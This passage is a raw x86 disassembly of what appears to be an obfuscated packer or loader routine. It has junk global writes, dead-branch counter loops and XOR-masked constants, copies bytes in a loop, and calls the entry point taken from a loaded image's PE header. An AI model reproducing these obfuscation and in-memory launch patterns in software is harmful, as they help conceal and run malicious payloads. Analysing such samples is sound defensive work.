  419435:	or     DWORD PTR ds:0x42c000,0x429014
  41943f:	push   0x57658733
  419444:	and    DWORD PTR ds:0x42c000,0x42900c
  41944e:	call   DWORD PTR ds:0x424008
  419454:	push   0x97667654
  419459:	call   DWORD PTR ds:0x424000
  41945f:	movzx  ebx,BYTE PTR ds:0x428004
  419466:	mov    eax,DWORD PTR [ebp-0x18]
  419469:	mov    ebx,0xf89c85b6
  41946e:	mov    DWORD PTR ds:0x42c018,0x6f46
  419478:	cmp    eax,ebx
  41947a:	mov    DWORD PTR ds:0x42c010,0x6381
  419484:	jne    0x4194d6
  41948a:	mov    DWORD PTR ds:0x421a22,0xf89c85b5
  419494:	adc    DWORD PTR ds:0x42a000,0x42801c
  41949e:	push   DWORD PTR [ebp+0x10]
  4194a1:	and    DWORD PTR ds:0x42a00c,0x42c00c
  4194ab:	push   DWORD PTR [ebp+0xc]
  4194ae:	push   DWORD PTR [ebp+0x8]
  4194b1:	or     DWORD PTR ds:0x42b008,0x5d49
  4194bb:	call   0x419233
  4194c0:	xor    DWORD PTR ds:0x42b018,ebx
  4194c6:	mov    ecx,DWORD PTR ds:0x421912
  4194cc:	or     esi,edi
  4194ce:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4194d4:	mov    DWORD PTR [ecx],eax
  4194d6:	mov    DWORD PTR [ebp-0x4],ebx
  4194d9:	sub    ecx,0x68bb
  4194df:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4194e6:	lea    eax,[ebp-0x44]
  4194e9:	mov    DWORD PTR [ebp-0x3c],eax
  4194ec:	adc    ecx,esi
  4194ee:	lea    eax,[ebp-0x48]
  4194f1:	not    DWORD PTR ds:0x42b008
  4194f7:	mov    DWORD PTR [ebp-0x24],eax
  4194fa:	mov    ecx,DWORD PTR ds:0x4237e9
  419500:	mov    esi,DWORD PTR ds:0x42174a
  419506:	sub    esi,ecx
  419508:	and    ecx,DWORD PTR [ecx+esi*1]
  41950b:	mov    eax,ds:0x421912
  419510:	mov    eax,DWORD PTR [eax+0x1c8]
  419516:	mov    eax,DWORD PTR [eax]
  419518:	and    edi,0x1f5e
  41951e:	mov    ecx,DWORD PTR [ebp-0x24]
  419521:	mov    esi,0x7510893
  419526:	xor    eax,esi
  419528:	mov    edi,0x3272db
  41952d:	add    eax,edi
  41952f:	mov    DWORD PTR ds:0x42b00c,0x7d8f
  419539:	mov    DWORD PTR [ecx],eax
  41953b:	mov    DWORD PTR ds:0x42a01c,0x3f3b
  419545:	mov    eax,ds:0x421b2e
  41954a:	mov    DWORD PTR ds:0x42b000,0x7292
  419554:	cmp    eax,0x301ac8f5
  419559:	mov    DWORD PTR ds:0x42a000,0x7d07
  419563:	jne    0x419756
  419569:	or     DWORD PTR ds:0x42a00c,0x42c008
  419573:	mov    eax,DWORD PTR [ebp-0x4]
  419576:	mov    DWORD PTR ds:0x42b008,0x18
  419580:	cmp    DWORD PTR ds:0x42b008,0x0
  419587:	je     0x4195f4
  41958d:	cmp    DWORD PTR ds:0x42b008,0x7
  419594:	jne    0x4195c4
  41959a:	push   0x42b018
  41959f:	push   0x1cad
  4195a4:	push   0x4fac
  4195a9:	push   0x428000
  4195ae:	push   0x3aa1
  4195b3:	push   0x42351e
  4195b8:	push   DWORD PTR [ebp-0x10]
  4195bb:	push   DWORD PTR [ebp-0x14]
  4195be:	call   DWORD PTR ds:0x424024
  4195c4:	cmp    DWORD PTR ds:0x42b008,0x8
  4195cb:	jne    0x4195de
  4195d1:	mov    edx,DWORD PTR ds:0x42b008
  4195d7:	dec    edx
  4195d8:	mov    DWORD PTR ds:0x42b008,edx
  4195de:	xor    edx,edx
  4195e0:	or     edx,DWORD PTR ds:0x42b008
  4195e6:	dec    edx
  4195e7:	mov    DWORD PTR ds:0x42b008,edx
  4195ed:	jmp    0x419580
  4195f2:	sbb    ecx,ecx
  4195f4:	mov    ecx,DWORD PTR ds:0x421912
  4195fa:	and    DWORD PTR ds:0x42c004,0xdaf
  419604:	mov    ecx,DWORD PTR [ecx+0x198]
  41960a:	movzx  edx,WORD PTR ds:0x42c014
  419611:	add    DWORD PTR ds:0x42b018,edx
  419617:	xor    eax,esi
  419619:	add    eax,edi
  41961b:	and    DWORD PTR ds:0x42801c,0x0
  419625:	xor    edx,edx
  419627:	or     edx,DWORD PTR ds:0x42801c
  41962d:	inc    edx
  41962e:	mov    DWORD PTR ds:0x42801c,edx
  419634:	cmp    DWORD PTR ds:0x42801c,0x8
  41963b:	jne    0x419654
  419641:	push   0x4705
  419646:	push   0x5b08
  41964b:	push   DWORD PTR [ebp-0x18]
  41964e:	call   DWORD PTR ds:0x424028
  419654:	cmp    DWORD PTR ds:0x42801c,0x7
  41965b:	jne    0x41966e
  419661:	mov    edx,DWORD PTR ds:0x42801c
  419667:	inc    edx
  419668:	mov    DWORD PTR ds:0x42801c,edx
  41966e:	cmp    DWORD PTR ds:0x42801c,0x18
  419675:	jb     0x419625
  41967b:	mov    edx,DWORD PTR ds:0x421742
  419681:	mov    edx,DWORD PTR [edx]
  419683:	and    DWORD PTR ds:0x42b000,edx
  419689:	mov    DWORD PTR [ecx],eax
  41968b:	adc    ecx,eax
  41968d:	mov    eax,DWORD PTR [ebp-0x4]
  419690:	xor    eax,esi
  419692:	mov    DWORD PTR ds:0x42a004,0x12
  41969c:	cmp    DWORD PTR ds:0x42a004,0x0
  4196a3:	je     0x4196fe
  4196a9:	cmp    DWORD PTR ds:0x42a004,0x4
  4196b0:	jne    0x4196c6
  4196b6:	push   0x423644
  4196bb:	push   0x4235bf
  4196c0:	call   DWORD PTR ds:0x424030
  4196c6:	cmp    DWORD PTR ds:0x42a004,0x5
  4196cd:	jne    0x4196e2
  4196d3:	xor    edx,edx
  4196d5:	add    edx,DWORD PTR ds:0x42a004
  4196db:	dec    edx
  4196dc:	mov    DWORD PTR ds:0x42a004,edx
  4196e2:	mov    edx,DWORD PTR ds:0x42a004
  4196e8:	dec    edx
  4196e9:	mov    DWORD PTR ds:0x42a004,edx
  4196ef:	jmp    0x41969c
  4196f4:	or     DWORD PTR ds:0x42b000,0x2eb5
  4196fe:	add    eax,edi
  419700:	and    DWORD PTR ds:0x428000,0x0
  41970a:	xor    ecx,ecx
  41970c:	or     ecx,DWORD PTR ds:0x428000
  419712:	inc    ecx
  419713:	mov    DWORD PTR ds:0x428000,ecx
  419719:	cmp    DWORD PTR ds:0x428000,0x26
  419720:	jne    0x419744
  419726:	push   DWORD PTR [ebp-0x1c]
  419729:	push   0x2787
  41972e:	push   DWORD PTR [ebp-0x20]
  419731:	push   DWORD PTR [ebp-0xc]
  419734:	push   0x458b
  419739:	push   0x42a000
  41973e:	call   DWORD PTR ds:0x424038
  419744:	cmp    DWORD PTR ds:0x428000,0x1e
  41974b:	jb     0x41970a
  419751:	mov    ds:0x421b2e,eax
  419756:	and    DWORD PTR ds:0x42a004,0x0
  419760:	xor    ecx,ecx
  419762:	xor    ecx,DWORD PTR ds:0x42a004
  419768:	inc    ecx
  419769:	mov    DWORD PTR ds:0x42a004,ecx
  41976f:	cmp    DWORD PTR ds:0x42a004,0x7
  419776:	jne    0x41978c
  41977c:	push   0x429018
  419781:	push   0x457c
  419786:	call   DWORD PTR ds:0x42403c
  41978c:	cmp    DWORD PTR ds:0x42a004,0x6
  419793:	jne    0x4197a6
  419799:	mov    ecx,DWORD PTR ds:0x42a004
  41979f:	inc    ecx
  4197a0:	mov    DWORD PTR ds:0x42a004,ecx
  4197a6:	cmp    DWORD PTR ds:0x42a004,0x1c
  4197ad:	jb     0x419760
  4197b3:	adc    edx,ecx
  4197b5:	mov    eax,ds:0x421912
  4197ba:	mov    eax,DWORD PTR [eax+0x18c]
  4197c0:	mov    eax,DWORD PTR [eax]
  4197c2:	mov    DWORD PTR [ebp-0x4c],eax
  4197c5:	xor    edx,edx
  4197c7:	add    edx,DWORD PTR ds:0x4237f9
  4197cd:	mov    eax,ds:0x42173e
  4197d2:	sub    eax,edx
  4197d4:	add    edx,DWORD PTR [edx+eax*1]
  4197d7:	mov    ecx,0xf89c85ba
  4197dc:	not    DWORD PTR ds:0x42b018
  4197e2:	mov    DWORD PTR [ebp-0x38],ecx
  4197e5:	mov    DWORD PTR [ebp-0x38],ecx
  4197e8:	neg    eax
  4197ea:	mov    DWORD PTR [ebp-0x38],ecx
  4197ed:	sbb    DWORD PTR ds:0x42a01c,0x6a2c
  4197f7:	mov    DWORD PTR [ebp-0x30],ebx
  4197fa:	sbb    ebx,ebx
  4197fc:	mov    DWORD PTR [ebp-0x38],ecx
  4197ff:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  419806:	and    DWORD PTR ds:0x42800c,0x0
  419810:	jmp    0x419822
  419815:	mov    edx,DWORD PTR ds:0x42800c
  41981b:	inc    edx
  41981c:	mov    DWORD PTR ds:0x42800c,edx
  419822:	cmp    DWORD PTR ds:0x42800c,0x1c
  419829:	jae    0x419869
  41982f:	cmp    DWORD PTR ds:0x42800c,0x10
  419836:	jne    0x41984a
  41983c:	push   DWORD PTR [ebp-0x20]
  41983f:	push   0x42363a
  419844:	call   DWORD PTR ds:0x424040
  41984a:	cmp    DWORD PTR ds:0x42800c,0xf
  419851:	jne    0x419864
  419857:	mov    edx,DWORD PTR ds:0x42800c
  41985d:	inc    edx
  41985e:	mov    DWORD PTR ds:0x42800c,edx
  419864:	jmp    0x419815
  419869:	mov    eax,DWORD PTR [ebp-0x4]
  41986c:	mov    edx,DWORD PTR [ebp-0x8]
  41986f:	inc    ebx
  419870:	mov    ebx,DWORD PTR [ebp-0x8]
  419873:	sub    DWORD PTR ds:0x42b008,0x42800c
  41987d:	xor    ebx,esi
  41987f:	xor    edx,esi
  419881:	and    DWORD PTR ds:0x42a010,0x42b01c
  41988b:	add    edx,ebx
  41988d:	and    DWORD PTR ds:0x42a01c,0x0
  419897:	jmp    0x4198ab
  41989c:	xor    ebx,ebx
  41989e:	add    ebx,DWORD PTR ds:0x42a01c
  4198a4:	inc    ebx
  4198a5:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ab:	cmp    DWORD PTR ds:0x42a01c,0x12
  4198b2:	jae    0x4198fd
  4198b8:	cmp    DWORD PTR ds:0x42a01c,0x8
  4198bf:	jne    0x4198d0
  4198c5:	push   0x4235a4
  4198ca:	call   DWORD PTR ds:0x424044
  4198d0:	cmp    DWORD PTR ds:0x42a01c,0x7
  4198d7:	jne    0x4198ea
  4198dd:	mov    ebx,DWORD PTR ds:0x42a01c
  4198e3:	inc    ebx
  4198e4:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ea:	jmp    0x41989c
  4198ef:	xor    ebx,ebx
  4198f1:	xor    ebx,DWORD PTR ds:0x42900c
  4198f7:	add    DWORD PTR ds:0x429000,ebx
  4198fd:	mov    ebx,DWORD PTR [ebp-0x8]
  419900:	sub    DWORD PTR ds:0x42900c,0x42800c
  41990a:	xor    ebx,esi
  41990c:	or     DWORD PTR ds:0x428000,0x42a00c
  419916:	xor    eax,esi
  419918:	add    eax,edi
  41991a:	mov    DWORD PTR ds:0x42b01c,0x7433
  419924:	lea    edx,[edx+ebx*1+0x975891]
  41992b:	mov    ebx,0x12a1
  419930:	mov    DWORD PTR [ebp-0x14],eax
  419933:	mov    ebx,0x8a29a123
  419938:	cmp    eax,edx
  41993a:	ja     0x419b96
  419940:	or     ecx,0x8d6
  419946:	mov    ecx,DWORD PTR [ebp-0x8]
  419949:	add    DWORD PTR ds:0x428018,ebx
  41994f:	xor    ecx,esi
  419951:	lea    ecx,[ecx+eax*1+0x3272db]
  419958:	add    DWORD PTR ds:0x429018,0x73bd
  419962:	mov    DWORD PTR [ebp-0x10],ecx
  419965:	adc    DWORD PTR ds:0x42c00c,ecx
  41996b:	mov    ecx,DWORD PTR [ebp-0x30]
  41996e:	inc    edx
  41996f:	xor    ecx,esi
  419971:	lea    ecx,[ebp+ecx*1+0x3272e3]
  419978:	xor    edx,edx
  41997a:	add    edx,DWORD PTR ds:0x42171e
  419980:	mov    edx,DWORD PTR [edx]
  419982:	or     DWORD PTR ds:0x42a008,edx
  419988:	mov    DWORD PTR [ebp-0x38],ecx
  41998b:	mov    ecx,DWORD PTR ds:0x421912
  419991:	mov    ecx,DWORD PTR [ecx+0x1bc]
  419997:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41999e:	mov    DWORD PTR ds:0x42b01c,0x13
  4199a8:	cmp    DWORD PTR ds:0x42b01c,0x0
  4199af:	je     0x4199ef
  4199b5:	cmp    DWORD PTR ds:0x42b01c,0x20
  4199bc:	jne    0x4199d7
  4199c2:	push   0x32fe
  4199c7:	push   0x42b000
  4199cc:	push   0x42379e
  4199d1:	call   DWORD PTR ds:0x424048
  4199d7:	mov    edx,DWORD PTR ds:0x42b01c
  4199dd:	dec    edx
  4199de:	mov    DWORD PTR ds:0x42b01c,edx
  4199e4:	jmp    0x4199a8
  4199e9:	dec    DWORD PTR ds:0x428020
  4199ef:	mov    DWORD PTR [ebp-0x34],ecx
  4199f2:	adc    DWORD PTR ds:0x42a004,ebx
  4199f8:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  4199ff:	adc    edx,edx
  419a01:	mov    ecx,DWORD PTR [ebp-0xc]
  419a04:	mov    edx,DWORD PTR ds:0x428024
  419a0a:	sbb    DWORD PTR ds:0x42c018,edx
  419a10:	mov    edx,DWORD PTR [ebp-0x10]
  419a13:	xor    ecx,esi
  419a15:	sbb    DWORD PTR ds:0x42b014,0x42b008
  419a1f:	add    ecx,edi
  419a21:	cmp    ecx,edx
  419a23:	mov    DWORD PTR ds:0x429004,0x1818
  419a2d:	je     0x419b62
  419a33:	mov    eax,DWORD PTR [ebp-0xc]
  419a36:	mov    DWORD PTR ds:0x428024,0x1374
  419a40:	mov    ecx,DWORD PTR [ebp-0x10]
  419a43:	xor    edx,edx
  419a45:	or     DWORD PTR ds:0x428008,0x428020
  419a4f:	xor    eax,esi
  419a51:	sub    DWORD PTR ds:0x42b004,0x42a008
  419a5b:	add    eax,edi
  419a5d:	sbb    DWORD PTR ds:0x42c018,0x42c014
  419a67:	add    ecx,0xfabdbef1
  419a6d:	adc    edx,0xffffffff
  419a70:	xor    ecx,ebx
  419a72:	sbb    DWORD PTR ds:0x42a010,0x42800c
  419a7c:	xor    edx,0x0
  419a7f:	mov    DWORD PTR [ebp-0x68],ecx
  419a82:	mov    ecx,DWORD PTR ds:0x42c014
  419a88:	or     DWORD PTR ds:0x42a008,ecx
  419a8e:	mov    DWORD PTR [ebp-0x64],edx
  419a91:	xor    edx,edx
  419a93:	mov    ecx,eax
  419a95:	add    ecx,0xfabdbef1
  419a9b:	adc    edx,0xffffffff
  419a9e:	xor    ecx,ebx
  419aa0:	xor    edx,0x0
  419aa3:	mov    DWORD PTR ds:0x42b008,0x242f
  419aad:	mov    DWORD PTR [ebp-0x24],eax
  419ab0:	mov    DWORD PTR ds:0x428018,0x30e6
  419aba:	mov    DWORD PTR [ebp-0x74],edx
  419abd:	mov    DWORD PTR ds:0x428018,0xdc5
  419ac7:	cmp    ecx,DWORD PTR [ebp-0x68]
  419aca:	jne    0x419ae5
  419ad0:	mov    ecx,DWORD PTR [ebp-0x64]
  419ad3:	cmp    edx,ecx
  419ad5:	mov    DWORD PTR ds:0x429004,0x231e
  419adf:	je     0x419b5f
  419ae5:	mov    ecx,DWORD PTR [ebp-0xc]
  419ae8:	mov    edx,DWORD PTR [ebp-0x20]
  419aeb:	xor    edx,esi
  419aed:	add    edx,edi
  419aef:	imul   edx,eax
  419af2:	xor    ecx,esi
  419af4:	add    ecx,eax
  419af6:	mov    eax,DWORD PTR [ebp-0x34]
  419af9:	mov    ebx,DWORD PTR [ebp-0x38]
  419afc:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419b03:	mov    BYTE PTR [edx+eax*1],cl
  419b06:	mov    eax,DWORD PTR [ebp-0x20]
  419b09:	mov    ecx,DWORD PTR [ebp-0x24]
  419b0c:	xor    eax,esi
  419b0e:	lea    eax,[ecx+eax*1+0x3272db]
  419b15:	mov    ecx,DWORD PTR [ebp-0x10]
  419b18:	xor    edx,edx
  419b1a:	add    ecx,0xfabdbef1
  419b20:	adc    edx,0xffffffff
  419b23:	xor    edx,0x0
  419b26:	mov    ebx,0x8a29a123
  419b2b:	xor    ecx,ebx
  419b2d:	mov    DWORD PTR [ebp-0x70],ecx
  419b30:	mov    DWORD PTR [ebp-0x6c],edx
  419b33:	xor    edx,edx
  419b35:	mov    ecx,eax
  419b37:	add    ecx,0xfabdbef1
  419b3d:	adc    edx,0xffffffff
  419b40:	xor    ecx,ebx
  419b42:	xor    edx,0x0
  419b45:	mov    DWORD PTR [ebp-0x24],eax
  419b48:	mov    DWORD PTR [ebp-0x7c],edx
  419b4b:	cmp    ecx,DWORD PTR [ebp-0x70]
  419b4e:	jne    0x419ae5
  419b54:	mov    ecx,DWORD PTR [ebp-0x6c]
  419b57:	cmp    edx,ecx
  419b59:	jne    0x419ae5
  419b5f:	mov    eax,DWORD PTR [ebp-0x14]
  419b62:	mov    ecx,DWORD PTR [ebp-0x8]
  419b65:	xor    ecx,esi
  419b67:	lea    eax,[eax+ecx*1+0x3272db]
  419b6e:	mov    ecx,DWORD PTR [ebp-0x8]
  419b71:	mov    edx,DWORD PTR [ebp-0x8]
  419b74:	xor    edx,esi
  419b76:	xor    ecx,esi
  419b78:	add    ecx,edx
  419b7a:	mov    edx,DWORD PTR [ebp-0x8]
  419b7d:	xor    edx,esi
  419b7f:	lea    ecx,[ecx+edx*1+0x975891]
  419b86:	mov    DWORD PTR [ebp-0x14],eax
  419b89:	cmp    eax,ecx
  419b8b:	jbe    0x419940
  419b91:	mov    ecx,0xf89c85ba
  419b96:	mov    eax,DWORD PTR [ebp+0xc]
  419b99:	mov    ds:0x421796,eax
  419b9e:	mov    eax,DWORD PTR [ebp+0x10]
  419ba1:	mov    ds:0x4219ea,eax
  419ba6:	mov    eax,ds:0x421796
  419bab:	mov    edx,DWORD PTR [ebp-0x3c]
  419bae:	sub    eax,edi
  419bb0:	xor    eax,esi
  419bb2:	mov    DWORD PTR [edx],eax
  419bb4:	mov    eax,DWORD PTR [ebp-0x18]
  419bb7:	cmp    eax,0xf89c85b6
  419bbc:	jne    0x419be7
  419bc2:	lea    eax,[ebp-0x28]
  419bc5:	mov    DWORD PTR [ebp-0x40],eax
  419bc8:	lea    eax,[ebp+0x4]
  419bcb:	mov    DWORD PTR [ebp-0x28],eax
  419bce:	mov    eax,DWORD PTR [ebp-0x28]
  419bd1:	test   eax,eax
  419bd3:	je     0x419cff
  419bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  419bdc:	mov    eax,DWORD PTR [ebp-0x8]
  419bdf:	lea    eax,[ebp-0x40]
  419be2:	jmp    0x419cf6
  419be7:	mov    eax,DWORD PTR [ebp-0x44]
  419bea:	cmp    eax,0xf89c85b5
  419bef:	je     0x419c4c
  419bf5:	mov    eax,DWORD PTR [ebp-0x4]
  419bf8:	mov    edx,DWORD PTR [ebp-0x48]
  419bfb:	xor    eax,esi
  419bfd:	add    eax,edi
  419bff:	cmp    eax,edx
  419c01:	je     0x419c4c
  419c07:	mov    eax,ds:0x421912
  419c0c:	mov    eax,DWORD PTR [eax+0x194]
  419c12:	mov    ecx,DWORD PTR [eax]
  419c14:	mov    eax,DWORD PTR [ecx+0x3c]
  419c17:	push   DWORD PTR ds:0x4219ea
  419c1d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  419c21:	push   DWORD PTR ds:0x421796
  419c27:	add    eax,ecx
  419c29:	mov    ecx,DWORD PTR ds:0x421912
  419c2f:	mov    ecx,DWORD PTR [ecx+0x194]
  419c35:	push   DWORD PTR [ecx]
  419c37:	call   eax
  419c39:	mov    ecx,DWORD PTR ds:0x421912
  419c3f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  419c45:	mov    DWORD PTR [ecx],eax
  419c47:	jmp    0x419cff
  419c4c:	mov    eax,DWORD PTR [ebp-0x4]
  419c4f:	mov    edx,DWORD PTR [ebp-0x4c]
  419c52:	xor    eax,esi
  419c54:	add    eax,edi
  419c56:	cmp    eax,edx
  419c58:	jne    0x419cb5
  419c5e:	mov    eax,DWORD PTR [ebp-0x4]
  419c61:	mov    edx,DWORD PTR ds:0x421912
  419c67:	mov    edx,DWORD PTR [edx+0x198]
  419c6d:	xor    eax,esi
  419c6f:	add    eax,edi
  419c71:	cmp    eax,DWORD PTR [edx]
  419c73:	jne    0x419c92
  419c79:	mov    eax,DWORD PTR [ebp-0x4]
  419c7c:	push   0xf89c85b6
  419c81:	xor    eax,esi
  419c83:	add    eax,edi
  419c85:	push   eax
  419c86:	push   ecx
  419c87:	push   DWORD PTR [ebp-0x8]
  419c8a:	push   DWORD PTR [ebp-0x4]
  419c8d:	call   0x408b5c
  419c92:	push   DWORD PTR [ebp-0x8]
  419c95:	push   DWORD PTR [ebp-0x4]
  419c98:	call   0x4091f8
  419c9d:	mov    eax,DWORD PTR [ebp-0x4]
  419ca0:	xor    eax,esi
  419ca2:	add    eax,edi
  419ca4:	mov    ds:0x421996,eax
  419ca9:	mov    eax,DWORD PTR [ebp-0x4]
  419cac:	xor    eax,esi
  419cae:	add    eax,edi
  419cb0:	mov    ds:0x42198e,eax
  419cb5:	lea    eax,[ebp-0x2c]
  419cb8:	mov    DWORD PTR [ebp-0x50],eax
  419cbb:	lea    eax,[ebp+0x4]
  419cbe:	mov    DWORD PTR [ebp-0x2c],eax
  419cc1:	mov    eax,DWORD PTR [ebp-0x2c]
  419cc4:	test   eax,eax
  419cc6:	je     0x419cff
  419ccc:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  419cd3:	mov    DWORD PTR [ebp-0x58],0x712ed08
  419cda:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  419ce1:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  419ce8:	call   0x401000
  419ced:	mov    eax,DWORD PTR [ebp-0x1c]
  419cf0:	mov    eax,DWORD PTR [ebp-0x8]
  419cf3:	lea    eax,[ebp-0x50]
  419cf6:	push   eax
  419cf7:	push   DWORD PTR [ebp-0x4]
  419cfa:	call   0x40883f
  419cff:	mov    eax,ds:0x421912
  419d04:	add    eax,0x1cc
  419d09:	mov    DWORD PTR [ebp-0x38],eax
  419d0c:	lea    eax,[ebp-0x1c]
  419d0f:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  419d16:	mov    DWORD PTR [ebp-0x3c],eax
  419d19:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  419d20:	mov    eax,DWORD PTR [ebp+0xc]
  419d23:	xor    eax,esi
  419d25:	mov    DWORD PTR [ebp+0x10],0x4
  419d2c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d2f:	add    eax,edi
  419d31:	cmp    eax,ecx
  419d33:	je     0x419df4
  419d39:	mov    eax,DWORD PTR [ebp+0xc]
  419d3c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d3f:	xor    edx,edx
  419d41:	xor    eax,esi
  419d43:	add    eax,edi
  419d45:	add    ecx,0xfabdbef1
  419d4b:	adc    edx,0xffffffff
  419d4e:	xor    ecx,ebx
  419d50:	xor    edx,0x0
  419d53:	mov    DWORD PTR [ebp-0x70],ecx
  419d56:	mov    DWORD PTR [ebp-0x6c],edx
  419d59:	xor    edx,edx
  419d5b:	mov    ecx,eax
  419d5d:	add    ecx,0xfabdbef1
  419d63:	adc    edx,0xffffffff
  419d66:	xor    ecx,ebx
  419d68:	xor    edx,0x0
  419d6b:	mov    DWORD PTR [ebp-0x20],eax
  419d6e:	cmp    ecx,DWORD PTR [ebp-0x70]
  419d71:	jne    0x419d80
  419d77:	cmp    edx,DWORD PTR [ebp-0x6c]
  419d7a:	je     0x419df4
  419d80:	mov    ecx,DWORD PTR [ebp+0xc]
  419d83:	mov    edx,DWORD PTR [ebp-0x24]
  419d86:	xor    edx,esi
  419d88:	xor    ecx,esi
  419d8a:	add    ecx,eax
  419d8c:	add    edx,edi
  419d8e:	imul   edx,eax
  419d91:	mov    eax,DWORD PTR [ebp-0x3c]
  419d94:	mov    ebx,DWORD PTR [ebp-0x38]
  419d97:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419d9e:	mov    BYTE PTR [edx+eax*1],cl
  419da1:	mov    eax,DWORD PTR [ebp-0x24]
  419da4:	mov    ecx,DWORD PTR [ebp-0x20]
  419da7:	mov    edx,DWORD PTR [ebp+0x10]
  419daa:	xor    eax,esi
  419dac:	lea    eax,[ecx+eax*1+0x3272db]
  419db3:	xor    ecx,ecx
  419db5:	add    edx,0xfabdbef1
  419dbb:	adc    ecx,0xffffffff
  419dbe:	xor    ecx,0x0
  419dc1:	mov    DWORD PTR [ebp-0x7c],ecx
  419dc4:	xor    ebx,ebx
  419dc6:	xor    edx,0x8a29a123
  419dcc:	mov    ecx,eax
  419dce:	add    ecx,0xfabdbef1
  419dd4:	adc    ebx,0xffffffff
  419dd7:	xor    ecx,0x8a29a123
  419ddd:	xor    ebx,0x0
  419de0:	mov    DWORD PTR [ebp-0x20],eax
  419de3:	cmp    ecx,edx
  419de5:	jne    0x419d80
  419deb:	cmp    ebx,DWORD PTR [ebp-0x7c]
  419dee:	jne    0x419d80
  419df4:	mov    eax,DWORD PTR [ebp-0x1c]
  419df7:	mov    eax,DWORD PTR [eax]
  419df9:	pop    edi
  419dfa:	pop    esi
  419dfb:	pop    ebx
  419dfc:	leave  
  419dfd:	ret    0xc
  419e00:	push   ebp
  419e01:	mov    ebp,esp
  419e03:	sub    esp,0xa4
  419e09:	mov    DWORD PTR ds:0x42b000,0x1b
  419e13:	cmp    DWORD PTR ds:0x42b000,0x0
  419e1a:	je     0x419e69
  419e20:	cmp    DWORD PTR ds:0x42b000,0x4
  419e27:	jne    0x419e3b
  419e2d:	push   0x428000
  419e32:	push   DWORD PTR [ebp-0xc]
  419e35:	call   DWORD PTR ds:0x424014
  419e3b:	cmp    DWORD PTR ds:0x42b000,0x5
  419e42:	jne    0x419e57
  419e48:	xor    ecx,ecx
  419e4a:	xor    ecx,DWORD PTR ds:0x42b000
  419e50:	dec    ecx
  419e51:	mov    DWORD PTR ds:0x42b000,ecx
  419e57:	mov    ecx,DWORD PTR ds:0x42b000
  419e5d:	dec    ecx
  419e5e:	mov    DWORD PTR ds:0x42b000,ecx
  419e64:	jmp    0x419e13
  419e69:	mov    ecx,DWORD PTR [ebp+0x8]
  419e6c:	add    DWORD PTR ds:0x429004,0x326a
  419e76:	mov    eax,0x8a85
  419e7b:	sbb    DWORD PTR ds:0x42c014,0x42a000
  419e85:	xor    ax,WORD PTR [ecx+0x20]
  419e89:	sbb    ecx,DWORD PTR ds:0x42c008
  419e8f:	mov    ecx,0x3b4b
  419e94:	add    ax,cx
  419e97:	not    ecx
  419e99:	movzx  eax,ax
  419e9c:	mov    DWORD PTR [ebp-0x18],eax
  419e9f:	mov    BYTE PTR [ebp-0x1],0x61
  419ea3:	sub    DWORD PTR ds:0x429018,edi
  419ea9:	lea    eax,[ebp-0x1]
  419eac:	mov    DWORD PTR [ebp-0x10],eax
  419eaf:	mov    al,BYTE PTR [ebp-0x1]
  419eb2:	mov    DWORD PTR ds:0x42b018,0x13
  419ebc:	cmp    DWORD PTR ds:0x42b018,0x0
  419ec3:	je     0x419f16
  419ec9:	cmp    DWORD PTR ds:0x42b018,0x1f
  419ed0:	jne    0x419efe
  419ed6:	push   0x7696
  419edb:	push   0x42c01c
  419ee0:	push   0x4031
  419ee5:	push   0x429010
  419eea:	push   0x1f96
  419eef:	push   DWORD PTR [ebp-0x18]
  419ef2:	push   DWORD PTR [ebp-0x20]
  419ef5:	push   DWORD PTR [ebp-0x1c]
  419ef8:	call   DWORD PTR ds:0x424018
  419efe:	mov    ecx,DWORD PTR ds:0x42b018
  419f04:	dec    ecx
  419f05:	mov    DWORD PTR ds:0x42b018,ecx
  419f0b:	jmp    0x419ebc
  419f10:	sub    DWORD PTR ds:0x428008,ecx
  419f16:	mov    ecx,DWORD PTR [ebp-0x10]
  419f19:	xor    al,0x6f
  419f1b:	adc    DWORD PTR ds:0x429004,0x428004
  419f25:	sub    al,0xd
  419f27:	mov    BYTE PTR [ecx],al
  419f29:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  419f30:	and    DWORD PTR ds:0x428010,0x0
  419f3a:	jmp    0x419f4c
  419f3f:	mov    ecx,DWORD PTR ds:0x428010
  419f45:	inc    ecx
  419f46:	mov    DWORD PTR ds:0x428010,ecx
  419f4c:	cmp    DWORD PTR ds:0x428010,0x12
  419f53:	jae    0x419f77
  419f59:	cmp    DWORD PTR ds:0x428010,0x22
  419f60:	jne    0x419f71
  419f66:	push   0x80ee
  419f6b:	call   DWORD PTR ds:0x42401c
  419f71:	jmp    0x419f3f
  419f76:	inc    eax
  419f77:	push   ebx
  419f78:	and    DWORD PTR ds:0x428020,0x0
  419f82:	mov    eax,ds:0x428020
  419f87:	inc    eax
  419f88:	mov    ds:0x428020,eax
  419f8d:	cmp    DWORD PTR ds:0x428020,0x21
  419f94:	jne    0x419fa8
  419f9a:	push   0x12b4
  419f9f:	push   DWORD PTR [ebp-0xc]
  419fa2:	call   DWORD PTR ds:0x424020
  419fa8:	cmp    DWORD PTR ds:0x428020,0x16
  419faf:	jb     0x419f82
  419fb5:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  419fbc:	sub    eax,0x5057
  419fc1:	mov    ecx,DWORD PTR [ebp-0x14]
  419fc4:	xor    DWORD PTR ds:0x42a010,0x31a
  419fce:	push   esi
  419fcf:	and    DWORD PTR ds:0x42801c,0x42b000
  419fd9:	mov    eax,0x7510893
  419fde:	xor    ecx,eax
  419fe0:	mov    esi,0x3272db
  419fe5:	push   edi
